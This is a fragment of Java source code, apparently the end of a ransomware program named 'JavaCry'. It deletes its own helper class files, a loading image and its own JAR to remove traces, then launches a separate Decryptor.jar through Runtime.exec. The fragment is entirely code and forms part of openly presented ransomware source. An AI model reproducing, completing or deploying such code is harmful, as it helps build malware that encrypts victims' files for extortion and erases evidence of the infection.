                    System.out.println("Deleted the file: "+ f.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                if (m.delete()) {
                    System.out.println("Deleted the file: "+ m.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File classFile=new File("Decryptor.class");

                if (classFile.delete()) {
                    System.out.println("Deleted the file: "+ classFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File helperFile=new File("Decryptor$1.class");

                if (helperFile.delete()) {
                    System.out.println("Deleted the file: "+ helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                helperFile=new File("ClientThread.class");
                if (helperFile.delete()) {
                    System.out.println("Deleted the file: "+ helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File loadingImg=new File("loading.gif");
                if (loadingImg.delete()) {
                    System.out.println("Deleted the file: "+ loadingImg.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File self=new File("JavaCry.jar");

                if (self.exists()) {
                    self.delete();
                }




                System.out.println("Done, running Decryptor");

/*
=========================================================
                Running Decryptor.jar
=========================================================
*/
                process=Runtime.getRuntime().exec(String.format("java -jar Decryptor.jar", System.getProperty("user.home")));

            }

            catch (Exception e) {
                System.out.println(2+""+e);
            }

        }
    }
}
